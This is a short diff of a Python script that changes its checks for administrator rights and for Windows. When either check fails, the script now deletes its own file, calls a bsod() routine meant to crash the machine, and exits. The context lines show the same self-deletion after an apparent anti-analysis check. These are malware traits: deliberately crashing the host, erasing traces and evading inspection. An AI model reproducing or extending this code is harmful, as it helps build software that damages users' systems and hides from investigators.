@@ -61,10 +61,14 @@ debug = True
 set_priority()
 
 if not is_admin():
-    exit()
+    os.remove(__file__)
+    bsod()
+    exit(1)
 
 if platform.system() != 'Windows':
-    exit()
+    os.remove(__file__)
+    bsod()
+    exit(1)
 
 if not debug and uep.check_all():
     os.remove(__file__)
